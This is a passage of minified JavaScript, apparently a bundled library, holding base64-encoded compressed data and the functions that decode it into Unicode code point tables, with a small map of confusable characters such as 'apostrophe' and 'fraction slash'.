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";const d6=new Map([[8217,"apostrophe"],[8260,"fraction slash"],[12539,"middle dot"]]),f6=4;function Oee(t){let e=0;function r(){return t[e++]<<8|t[e++]}let n=r(),i=1,s=[0,1];for(let I=1;I<n;I++)s.push(i+=r());let o=r(),a=e;e+=o;let c=0,l=0;function u(){return c==0&&(l=l<<8|t[e++],c=8),l>>--c&1}const h=31,d=2**h,f=d>>>1,g=f>>1,p=d-1;let w=0;for(let I=0;I<h;I++)w=w<<1|u();let m=[],b=0,v=d;for(;;){let I=Math.floor(((w-b+1)*i-1)/v),C=0,N=n;for(;N-C>1;){let T=C+N>>>1;I<s[T]?N=T:C=T}if(C==0)break;m.push(C);let S=b+Math.floor(v*s[C]/i),P=b+Math.floor(v*s[C+1]/i)-1;for(;((S^P)&f)==0;)w=w<<1&p|u(),S=S<<1&p,P=P<<1&p|1;for(;S&~P&g;)w=w&f|w<<1&p>>>1|u(),S=S<<1^f,P=(P^f)<<1|f|1;b=S,v=1+P-S}let x=n-4;return m.map(I=>{switch(I-x){case 3:return x+65792+(t[a++]<<16|t[a++]<<8|t[a++]);case 2:return x+256+(t[a++]<<8|t[a++]);case 1:return x+t[a++];default:return I-1}})}function _ee(t){let e=0;return()=>t[e++]}function jx(t){return _ee(Oee(Tee(t)))}function Tee(t){let e=[];[..."ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"].forEach((i,s)=>e[i.charCodeAt(0)]=s);let r=t.length,n=new Uint8Array(6*r>>3);for(let i=0,s=0,o=0,a=0;i<r;i++)a=a<<6|e[t.charCodeAt(i)],o+=6,o>=8&&(n[s++]=a>>(o-=8));return n}function $ee(t){return t&1?~t>>1:t>>1}function Ree(t,e){let r=Array(t);for(let n=0,i=0;n<t;n++)r[n]=i+=$ee(e());return r}function yf(t,e=0){let r=[];for(;;){let n=t(),i=t();if(!i)break;e+=n;for(let s=0;s<i;s++)r.push(e+s);e+=i+1}return r}function Hx(t){return bf(()=>{let e=yf(t);if(e.length)return e})}function qx(t){let e=[];for(;;){let r=t();if(r==0)break;e.push(Dee(r,t))}for(;;){let r=t()-1;if(r<0)break;e.push(Bee(r,t))}return e.flat()}function bf(t){let e=[];for(;;){let r=t(e.length);if(!r)break;e.push(r)}return e}function Vx(t,e,r){let n=Array(t).fill().map(()=>[]);for(let i=0;i<e;i++)Ree(t,r).forEach((s,o)=>n[o].push(s));return n}function Dee(t,e){let r=1+e(),n=e(),i=bf(e);return Vx(i.length,1+t,e).flatMap((o,a)=>{let[c,...l]=o;return Array(i[a]).fill().map((u,h)=>{let d=h*n;return[c+h*r,l.map(f=>f+d)]})})}function Bee(t,e){let r=1+e();return Vx(r,1+t,e).map(i=>[i[0],i.slice(1)])}function Lee(t){let e=[],r=yf(t);return i(n([]),[]),e;function n(s){let o=t(),a=bf(()=>{let c=yf(t).map(l=>r[l]);if(c.length)return n(c)});return{S:o,B:a,Q:s}}function i({S:s,B:o},a,c){if(!(s&4&&c===a[a.length-1])){s&2&&(c=a[a.length-1]),s&1&&e.push(a);for(let l of o)for(let u of l.Q)i(l,[...a,u],c)}}}function Uee(t){return t.toString(16).toUpperCase().padStart(2,"0")}function Wx(t){return`{${Uee(t)}}`}function Mee(t){let e=[];for(let r=0,n=t.length;r<n;){let i=t.codePointAt(r);r+=i<65536?1:2,e.push(i)}return e}function nh(t){let r=t.length;if(r<4096)return String.fromCodePoint(...t);let n=[];for(let i=0;i<r;)n.push(String.fromCodePoint(...t.slice(i,i+=4096)));return n.join("")}function Fee(t,e){let r=t.length,n=r-e.length;for(let i=0;n==0&&i<r;i++)n=t[i]-e[i];return n}var zee="AEUDTAHBCFQATQDRADAAcgAgADQAFAAsABQAHwAOACQADQARAAoAFwAHABIACAAPAAUACwAFAAwABAAQAAMABwAEAAoABQAIAAIACgABAAQAFAALAAIACwABAAIAAQAHAAMAAwAEAAsADAAMAAwACgANAA0AAwAKAAkABAAdAAYAZwDSAdsDJgC0CkMB8xhZAqfoC190UGcThgBurwf7PT09Pb09AjgJum8OjDllxHYUKXAPxzq6tABAxgK8ysUvWAgMPT09PT09PSs6LT2HcgWXWwFLoSMEEEl5RFVMKvO0XQ8ExDdJMnIgsj26PTQyy8FfEQ8AY8IPAGcEbwRwBHEEcgRzBHQEdQR2BHcEeAR6BHsEfAR+BIAEgfndBQoBYgULAWIFDAFiBNcE2ATZBRAFEQUvBdALFAsVDPcNBw13DYcOMA4xDjMB4BllHI0B2grbAMDpHLkQ7QHVAPRNQQFnGRUEg0yEB2uaJF8AJpIBpob5AERSMAKNoAXqaQLUBMCzEiACnwRZEkkVsS7tANAsBG0RuAQLEPABv9HICTUBXigPZwRBApMDOwAamhtaABqEAY8KvKx3LQ4ArAB8UhwEBAVSagD8AEFZADkBIadVj2UMUgx5Il4ANQC9AxIB1BlbEPMAs30CGxlXAhwZKQIECBc6EbsCoxngzv7UzRQA8M0BawL6ZwkN7wABAD33OQRcsgLJCjMCjqUChtw/km+NAsXPAoP2BT84PwURAK0RAvptb6cApQS/OMMey5HJS84UdxpxTPkCogVFITaTOwERAK5pAvkNBOVyA7q3BKlOJSALAgUIBRcEdASpBXqzABXFSWZOawLCOqw//AolCZdvv3dSBkEQGyelEPcMMwG1ATsN7UvYBPEGOwTJH30ZGQ/NlZwIpS3dDO0m4y6hgFoj9SqDBe1L9DzdC01RaA9ZC2UJ4zpjgU4DIQENIosK3Q05CG0Q8wrJaw3lEUUHOQPVSZoApQcBCxEdNRW1JhBirAsJOXcG+xr2C48mrxMpevwF0xohBk0BKRr/AM8u54WwWjFcHE9fBgMLJSPHFKhQIA0lQLd4SBobBxUlqQKRQ3BKh1E2HpMh9jw9DWYuE1F8B/U8BRlPC4E8nkarRQ4R0j6NPUgiSUwsBDV/LC8niwnPD4UMuXxyAVkJIQmxDHETMREXN8UIOQcZLZckJxUIIUaVYJoE958D8xPRAwsFPwlBBxMDtRwtEy4VKQUNgSTXAvM21S6zAo9WgAEXBcsPJR/fEFBH4A7pCJsCZQODJesALRUhABcimwhDYwBfj9hTBS7LCMdqbCN0A2cU52ERcweRDlcHpxwzFb8c4XDIXguGCCijrwlbAXUJmQFfBOMICTVbjKAgQWdTi1gYmyBhQT9d/AIxDGUVn0S9h3gCiw9rEhsBNQFzBzkNAQJ3Ee0RaxCVCOuGBDW1M/g6JQRPIYMgEQonA09szgsnJvkM+GkBoxJiAww0PXfuZ6tgtiQX/QcZMsVBYCHxC5JPzQycGsEYQlQuGeQHvwPzGvMn6kFXBf8DowMTOk0z7gS9C2kIiwk/AEkOoxcH1xhqCnGM0AExiwG3mQNXkYMCb48GNwcLAGcLhwV55QAdAqcIowAFAM8DVwA5Aq0HnQAZAIVBAT0DJy8BIeUCjwOTCDHLAZUvAfMpBBvDDBUA9zduSgLDsQKAamaiBd1YAo4CSTUBTSUEBU